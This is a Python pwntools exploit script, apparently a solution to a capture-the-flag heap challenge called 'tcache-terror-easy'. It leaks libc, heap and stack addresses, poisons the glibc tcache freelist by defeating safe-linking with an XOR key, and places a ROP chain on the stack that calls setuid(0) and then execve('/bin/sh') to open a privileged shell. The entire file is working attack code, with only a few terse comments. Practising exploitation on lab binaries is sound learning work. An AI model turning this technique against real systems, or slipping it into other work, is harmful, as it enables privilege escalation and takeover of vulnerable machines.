#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level = "error"

elf = context.binary = ELF("/challenge/tcache-terror-easy")
libc = ELF("/challenge/lib/libc.so.6")
def safe_read(io,index,data):
    payload = b"safe_read " + str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def safe_write(io,index):
    payload = b'safe_write ' + str(index).encode()
    io.sendline(payload)
    return io

def read_flag(io):
    io.sendline(b"read_flag")
    return io

def get_leak(io):
    data = io.recvuntil(b"[*]").decode()
    print(data)
    stack_leak = int(re.findall(r"0x[a-f\d]+",data)[0],16)
    pie_leak = int(re.findall(r"0x[a-f\d]+",data)[1],16)
    print(stack_leak,pie_leak)
    return io,stack_leak,pie_leak

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def read(io,index,size):
    payload = b"read " + str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io

def send_flag(io,secret):
    payload = b"send_flag " + secret
    io.sendline(payload)
    return io

def xor_num(n1,n2):
    return n1 ^ n2

def get_libc(io):
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,0,24)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,1,0x500)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,2,24)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    
    io = free(io,1)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,1,0x500)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = safe_write(io,1)
    data = io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):")
    print(data.decode('latin-1'))
    leak = int.from_bytes(data.split(b'Index:')[1].split(b"\n")[2][:8],"little")
    libc_base = leak - 0x219ce0
    print(hex(libc_base),hex(leak))
    return io,libc_base

def get_rop_chain():
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi","ret"]).address
    pop_rax = rop.find_gadget(["pop rax","ret"]).address
    pop_rsi = rop.find_gadget(["pop rsi","ret"]).address
    pop_rdx = rop.find_gadget(["pop rdx","ret"]).address
    ret = rop.find_gadget(["ret"]).address
    payload = p64(pop_rdi) + p64(0)
    payload += p64(ret)
    payload += p64(libc.sym.setuid)
    payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
    payload += p64(pop_rsi) + p64(0)
    payload += p64(pop_rdx) + p64(0)
    payload += p64(ret)
    payload += p64(libc.sym.execve)

    print(len(payload))
    return payload


def main():
    io = process()

    #get the libc leak and subtract with the offset to get libc_base
    io,libc_base = get_libc(io)
    libc.address = libc_base

    # leak the base of the heap which is of 5 bits for one 4kb page
    io = free(io,2)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,2,24)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = safe_write(io,2)
    data = io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):")
    print(data.decode('latin-1'))
    key = int.from_bytes(data.split(b'Index:')[1].split(b"\n")[2][:5],"little")
    
    # leak the stack address using environ function of libc and also calculate the ret address
    io = malloc(io,3,24)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,4,24)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,5,24)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = free(io,5)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = free(io,4)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = safe_read(io,3,b"a" * 24 + p64(0x21) + p64(xor_num(libc.sym.environ,key)))
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,3,24)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,4,24)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = safe_write(io,4)
    data = io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):")
    print(data.decode('latin-1'))
    stack = int.from_bytes(data.split(b'Index:')[1].split(b"\n")[2][:8],"little")
    ret_add = stack - 296
    

    # write the rop chain in  the ret addressbecaus of i cannot get theret add stack address becaus of allocation alignment check so i calculate he rbp address and write the rop chain
    io = malloc(io,3,0x68)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,4,0x68)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,5,0x68)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = free(io,5)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = free(io,4)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = safe_read(io,3,b"a" * 0x68 + p64(0x21) + p64(xor_num(ret_add,key)))
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,3,0x68)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    io = malloc(io,4,0x68)
    print(io.recvuntil(b" Function (malloc/free/safe_write/safe_read/quit):").decode())
    payload = get_rop_chain()

    io = safe_read(io,4,p64(1) + payload)
    io = quit(io)
    io.interactive()
main()
